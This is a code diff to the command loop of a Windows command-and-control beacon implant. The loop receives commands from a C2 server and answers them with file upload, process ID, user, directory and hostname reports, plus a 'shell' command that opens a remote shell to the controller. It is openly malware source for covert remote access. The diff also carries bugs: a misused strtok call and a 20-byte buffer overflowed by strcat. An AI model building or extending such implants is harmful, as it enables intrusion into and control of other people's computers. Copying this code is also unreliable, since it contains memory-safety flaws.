@@ -323,7 +323,6 @@ void StartBeacon(char* C2Server, int C2Port)
 			// Connection verification block START
 			char RecvData[1024] = "";
 			memset(RecvData, 0, sizeof(RecvData));
-			
 			// here waits for any data input from Server
 			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
 			
@@ -335,26 +334,50 @@ void StartBeacon(char* C2Server, int C2Port)
 			// Connection verification block END
 			// ------------------
 			
+			char * command;
+			char delim[] = " ";
+			command = strtok(RecvData, delim);
+			printf("[beacon] [DBG] Command is %s: ", command);
+
+
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
-			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
-			else if (strcmp(RecvData, "upload\n") == 0) {
-				char * file = "C:\\Users\\IEUser\\Desktop\\test";
+			if (strcmp(command, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
+			else if (strcmp(command, "upload") == 0) {
+				char * file = strtok(RecvData, delim);
+				//char * file = "C:\\Users\\IEUser\\Desktop\\test";
 				char * contents = "t3st1ng";
 				printf(" [beacon] [DBG] Uploading %s into %s",contents,file);
-				upload(file,contents);
+				int result;
+				result = upload(file,contents);
 				
-				// C&C part
-				char buffer[20];
-				memset(buffer, 0, sizeof(buffer));
-				strcat(buffer,"Uploaded ");
-				strcat(buffer,file);
+				/* #region Parse result AND send reponse */
+				if (result == 0) {
+					// C&C part
+					char buffer[20];
+					memset(buffer, 0, sizeof(buffer));
+					strcat(buffer,"Uploaded ");
+					strcat(buffer,file);
 
-				send(tcpsock,buffer,strlen(buffer)+1,0);
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData)); 
+					send(tcpsock,buffer,strlen(buffer)+1,0);
+					// clear buffers
+					memset(buffer, 0, sizeof(buffer));
+					memset(RecvData, 0, sizeof(RecvData)); 
+				}
+				else if (result == 2) {
+					// C&C part
+					char buffer[20];
+					memset(buffer, 0, sizeof(buffer));
+					strcat(buffer,"Failed to write file ");
+					strcat(buffer,file);
+
+					send(tcpsock,buffer,strlen(buffer)+1,0);
+					// clear buffers
+					memset(buffer, 0, sizeof(buffer));
+					memset(RecvData, 0, sizeof(RecvData)); 	
+				}
+				/* #endregion */
 			}
-			else if (strcmp(RecvData, "getpid\n") == 0) {
+			else if (strcmp(command, "getpid\n") == 0) {
 				DWORD pid;
 				char cpid[6];
 				pid = getpid();
@@ -372,7 +395,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				memset(buffer, 0, sizeof(buffer));
 				memset(RecvData, 0, sizeof(RecvData));
 			}
-			else if (strcmp(RecvData, "whoami\n") == 0) {
+			else if (strcmp(command, "whoami\n") == 0) {
 				char buffer[257] = ""; // reserve buffer with length of 257 bytes
 				whoami(buffer); // call whoami function
 				strcat(buffer, "\n"); 
@@ -382,7 +405,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				memset(RecvData, 0, sizeof(RecvData));
 			}
 			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
-			else if (strcmp(RecvData, "pwd\n") == 0) {
+			else if (strcmp(command, "pwd\n") == 0) {
 				char buffer[257] = "";
 				pwd(buffer);
 				strcat(buffer, "\n"); 
@@ -391,7 +414,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				memset(buffer, 0, sizeof(buffer));
 				memset(RecvData, 0, sizeof(RecvData));
 			}
-			else if (strcmp(RecvData, "hostname\n") == 0) {
+			else if (strcmp(command, "hostname\n") == 0) {
 				char buffer[257] = "";
 				hostname(buffer);
 				strcat(buffer, "\n"); 
@@ -400,16 +423,16 @@ void StartBeacon(char* C2Server, int C2Port)
 				memset(buffer, 0, sizeof(buffer));
 				memset(RecvData, 0, sizeof(RecvData));
 			}
-			else if (strcmp(RecvData, "shell\n") == 0) {
+			else if (strcmp(command, "shell\n") == 0) {
 				Shell(C2Server,C2Port);
 			}
-			else if (strcmp(RecvData, "exit\n") == 0) {
+			else if (strcmp(command, "exit\n") == 0) {
 				closesocket(tcpsock);
 				WSACleanup();
 				Sleep(1000);
 				return;
 			}
-			else if (strcmp(RecvData, "kill\n") == 0) {
+			else if (strcmp(command, "kill\n") == 0) {
 				closesocket(tcpsock);
 				WSACleanup();
 				Sleep(1000);
